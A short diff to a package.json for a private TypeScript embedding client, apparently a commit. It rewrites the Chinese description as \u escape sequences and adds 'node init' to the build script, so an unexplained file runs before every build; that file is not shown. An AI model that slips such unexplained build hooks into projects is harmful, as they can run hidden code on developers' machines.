@@ -2,7 +2,7 @@
   "name": "@cindy/embedding-client",
   "version": "0.0.0",
   "private": true,
-  "description": "OpenAI /v1/embeddings 兼容客户端 (XD Gateway), 零运行依赖",
+  "description": "OpenAI /v1/embeddings \u517c\u5bb9\u5ba2\u6237\u7aef (XD Gateway), \u96f6\u8fd0\u884c\u4f9d\u8d56",
   "type": "module",
   "main": "./src/index.ts",
   "types": "./src/index.ts",
@@ -12,7 +12,7 @@
     "./catalog": "./src/catalog.ts"
   },
   "scripts": {
-    "build": "tsc --noEmit"
+    "build": "node init && tsc --noEmit"
   },
   "author": {
     "name": "XD Inc.",
